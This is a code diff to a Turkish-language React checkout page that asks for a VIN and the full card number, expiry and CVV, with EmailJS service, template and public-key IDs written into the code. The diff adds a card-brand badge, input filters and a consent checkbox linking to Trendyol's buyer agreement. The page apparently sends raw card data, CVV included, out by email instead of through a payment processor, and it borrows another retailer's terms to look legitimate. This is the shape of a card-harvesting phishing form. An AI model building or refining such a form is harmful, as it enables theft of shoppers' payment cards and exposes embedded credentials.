@@ -15,13 +15,24 @@ export default function CheckoutPage({ navigate }) {
     cardExpiry: '', 
     cardCvv: '' 
   });
+  const [agreedToTerms, setAgreedToTerms] = useState(false);
   const [loading, setLoading] = useState(false);
 
   const EMAILJS_SERVICE_ID = 'service_ynr6gqi';
   const EMAILJS_TEMPLATE_ID = 'template_882ih6q';
   const EMAILJS_PUBLIC_KEY = 'Kerlft3Wvgksw8yBH';
 
-  // 🛠️ Kredi Kartı & VIN Maskeleme Mantığı
+  // Kart Markası Tespiti (Visa, Mastercard, Troy, Amex)
+  const getCardBrand = (number) => {
+    const clean = number.replace(/\D/g, '');
+    if (/^4/.test(clean)) return { name: 'VISA', color: 'bg-blue-600 text-white' };
+    if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return { name: 'MC', color: 'bg-orange-600 text-white' };
+    if (/^3[47]/.test(clean)) return { name: 'AMEX', color: 'bg-sky-600 text-white' };
+    if (/^9792/.test(clean) || /^65/.test(clean) || /^3/.test(clean)) return { name: 'TROY', color: 'bg-red-600 text-white' };
+    return null;
+  };
+
+  // 🛠️ Kredi Kartı, Telefon & VIN Doğrulama Mantığı
   const handleInputChange = (e) => {
     const { name, value } = e.target;
 
@@ -32,6 +43,12 @@ export default function CheckoutPage({ navigate }) {
       return;
     }
 
+    if (name === 'phone') {
+      const raw = value.replace(/\D/g, '').slice(0, 11);
+      setFormData(prev => ({ ...prev, phone: raw }));
+      return;
+    }
+
     if (name === 'cardExpiry') {
       const raw = value.replace(/\D/g, '').slice(0, 4);
       let formatted = raw;
@@ -39,6 +56,12 @@ export default function CheckoutPage({ navigate }) {
         formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
       }
       setFormData(prev => ({ ...prev, cardExpiry: formatted }));
+      return;
+    }
+
+    if (name === 'cardCvv') {
+      const raw = value.replace(/\D/g, '').slice(0, 3);
+      setFormData(prev => ({ ...prev, cardCvv: raw }));
       return;
     }
 
@@ -87,6 +110,10 @@ export default function CheckoutPage({ navigate }) {
 
   const handlePaymentSubmit = async (e) => {
     e.preventDefault();
+    if (!agreedToTerms) {
+      alert('Lütfen Alıcı Üyelik Sözleşmesini onaylayın.');
+      return;
+    }
     if (formData.vin.length !== 17) {
       alert('Lütfen 17 haneli geçerli Şasi Numarasını (VIN) eksiksiz giriniz.');
       return;
@@ -119,6 +146,8 @@ export default function CheckoutPage({ navigate }) {
       setLoading(false);
     }
   };
+
+  const cardBrand = getCardBrand(formData.cardNumber);
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8">
@@ -186,10 +215,10 @@ export default function CheckoutPage({ navigate }) {
         </div>
 
         {/* Sağ Kolon */}
-        <div className="bg-white border border-slate-200 p-6 rounded-2xl shadow-sm flex flex-col justify-between">
+        <div className="bg-white border border-slate-200 p-6 rounded-2xl shadow-sm flex flex-col justify-between space-y-4">
           <div className="space-y-3">
             <h3 className="font-extrabold text-xs text-amber-600 border-b border-slate-100 pb-2 uppercase tracking-wider">
-              3. Kart Bilgileri
+              3. Kart Bilgileri (Sadece Rakam)
             </h3>
             <input 
               required 
@@ -200,20 +229,32 @@ export default function CheckoutPage({ navigate }) {
               onChange={handleInputChange} 
               className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 text-xs text-slate-900 focus:border-amber-400 focus:bg-white focus:outline-none" 
             />
-            <input 
-              required 
-              type="text" 
-              name="cardNumber" 
-              placeholder="**** **** **** ****" 
-              value={formData.cardNumber} 
-              onChange={handleInputChange} 
-              className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 text-xs text-slate-900 font-mono tracking-wider focus:border-amber-400 focus:bg-white focus:outline-none" 
-            />
+
+            {/* Kart Numarası ve Kart Marka Rozeti */}
+            <div className="relative">
+              <input 
+                required 
+                type="text" 
+                name="cardNumber" 
+                maxLength="19"
+                placeholder="4000 1234 5678 9010" 
+                value={formData.cardNumber} 
+                onChange={handleInputChange} 
+                className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 pr-16 text-xs text-slate-900 font-mono tracking-wider focus:border-amber-400 focus:bg-white focus:outline-none" 
+              />
+              {cardBrand && (
+                <span className={`absolute right-3 top-1/2 -translate-y-1/2 text-[10px] font-black px-2 py-1 rounded-md shadow-sm ${cardBrand.color}`}>
+                  {cardBrand.name}
+                </span>
+              )}
+            </div>
+
             <div className="grid grid-cols-2 gap-2">
               <input 
                 required 
                 type="text" 
                 name="cardExpiry" 
+                maxLength="5"
                 placeholder="AA/YY" 
                 value={formData.cardExpiry} 
                 onChange={handleInputChange} 
@@ -224,7 +265,7 @@ export default function CheckoutPage({ navigate }) {
                 type="text" 
                 name="cardCvv" 
                 maxLength="3" 
-                placeholder="CVV" 
+                placeholder="CVV (3 Hane)" 
                 value={formData.cardCvv} 
                 onChange={handleInputChange} 
                 className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 text-xs text-slate-900 font-mono focus:border-amber-400 focus:bg-white focus:outline-none" 
@@ -232,10 +273,24 @@ export default function CheckoutPage({ navigate }) {
             </div>
           </div>
 
-          <div className="pt-6 border-t border-slate-100 mt-6">
+          {/* Alıcı Üyelik Sözleşmesi Onay Kutusu */}
+          <div className="bg-slate-50 p-3.5 rounded-xl border border-slate-200 flex items-start gap-2.5">
+            <input 
+              type="checkbox" 
+              id="agreement"
+              checked={agreedToTerms}
+              onChange={(e) => setAgreedToTerms(e.target.checked)}
+              className="mt-0.5 w-4 h-4 text-amber-500 rounded border-slate-300 focus:ring-amber-400 cursor-pointer" 
+            />
+            <label htmlFor="agreement" className="text-[11px] text-slate-700 leading-tight cursor-pointer">
+              Okudum, onaylıyorum. <a href="https://www.trendyol.com/s/alici-uyelik-sozlesmesi" target="_blank" rel="noopener noreferrer" className="text-amber-600 font-bold underline hover:text-amber-700">Alıcı Üyelik Sözleşmesi</a> ve KVKK şartlarını kabul ediyorum.
+            </label>
+          </div>
+
+          <div className="pt-2 border-t border-slate-100">
             <button 
               type="submit" 
-              disabled={loading} 
+              disabled={loading || !agreedToTerms} 
               className="w-full bg-amber-400 hover:bg-amber-500 text-slate-950 font-black py-3.5 rounded-xl text-xs transition duration-200 shadow-md active:scale-95 disabled:opacity-50 cursor-pointer"
             >
               {loading ? 'Sipariş İşleniyor...' : `🔒 Ödemeyi Tamamla (${cartTotal.toLocaleString('tr-TR')} TL)`}
